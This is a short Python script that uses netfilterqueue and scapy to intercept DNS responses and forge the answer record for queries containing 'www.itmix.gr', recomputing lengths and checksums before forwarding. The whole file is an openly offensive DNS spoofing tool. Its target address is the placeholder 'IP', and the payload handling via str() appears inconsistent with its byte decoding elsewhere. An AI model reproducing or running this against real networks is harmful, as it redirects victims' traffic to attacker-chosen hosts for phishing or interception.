import netfilterqueue
import scapy

from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNSRR, DNSQR, DNS


def processPacket(packet): # packte is str
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        if "www.itmix.gr" in qname.decode("utf-8"):
            print("*** Spoofing target ***")

            # creating response
            response = DNSRR(rrname = qname, rdata = "IP")
            scapy_packet[DNS].an = response
            scapy_packet[DNS].ancount = 1

            del scapy_packet[IP].len
            del scapy_packet[IP].chksum

            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum


            packet.set_payload(str(scapy_packet))

    packet.accept()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket)
queue.run()